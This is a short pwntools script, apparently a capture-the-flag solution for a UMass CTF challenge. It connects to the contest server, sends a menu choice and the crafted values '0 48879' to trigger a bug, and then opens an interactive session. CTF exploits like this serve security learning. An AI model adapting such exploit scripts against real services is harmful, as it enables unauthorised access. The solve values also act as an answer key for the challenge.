from pwn import *
p = remote('bad-eraser-brick-workshop.pwn.ctf.umasscybersec.org', 45002)

p.sendlineafter(b"> ", b"3")
p.sendlineafter(b"mold id and pigment code.\n", b"0 48879")
p.sendlineafter(b"> ", b"3")

p.interactive()